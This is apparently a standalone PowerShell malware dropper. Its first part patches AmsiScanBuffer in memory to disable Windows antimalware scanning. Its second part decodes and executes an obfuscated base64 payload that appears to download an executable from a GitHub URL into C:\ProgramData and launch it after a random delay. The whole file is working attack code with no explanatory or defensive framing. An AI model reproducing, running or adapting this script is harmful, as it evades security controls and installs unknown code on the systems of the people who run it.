# AMSI Bypass Code
Add-Type -Name Win32 -Namespace Native -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll")]
public static extern IntPtr GetModuleHandle(string moduleName);
[DllImport("kernel32.dll")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@

$amsiHandle = [Native.Win32]::GetModuleHandle("amsi.dll")
$amsiScanBufferPtr = [Native.Win32]::GetProcAddress($amsiHandle, "AmsiScanBuffer")
$buf = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # Patch to return ERROR_INVALID_PARAMETER
[uint32]$oldProtect = 0
[Native.Win32]::VirtualProtect($amsiScanBufferPtr, [uint32]6, 0x40, [ref]$oldProtect)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $amsiScanBufferPtr, 6)

# Original Payload Execution
$encodedPayload = 'JABmAHIAYQBnADMAPQAnAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZgBsAG8AbwByAHMAbwBmAG8AbABnAGEALQBzAHYAZwAvAHMAaQBnAG4AZQBkAGYAaQBsAGUAcwAvAHIAYQB3AC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBhAGwAbQBhAGoAZABpAGEAaABfAGUAeAB0AGUAbgBzAGkAbwBuAC4AZQB4AGUAJwA7ACQAZgByAGEAZwA1AD0AJwBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABwAHIAbwBnAHIAYQBtAC4AZQB4AGUAJwA7AEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAGYAcgBhAGcAMwAgAC0ATwB1AHQARgBpAGwAZQAgACQAZgByAGEAZwA1ADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAKABbAE0AYQB0AGgAXQA6ADoAQQBiAHMAKAAoAEcAZQB0AC0AUgBhAG4AZABvAG0AKQAlADEAMAApACsANQApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAZgByAGEAZwA1AA=='
$decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedPayload))
$exec = [ScriptBlock]::Create($decoded)
& $exec
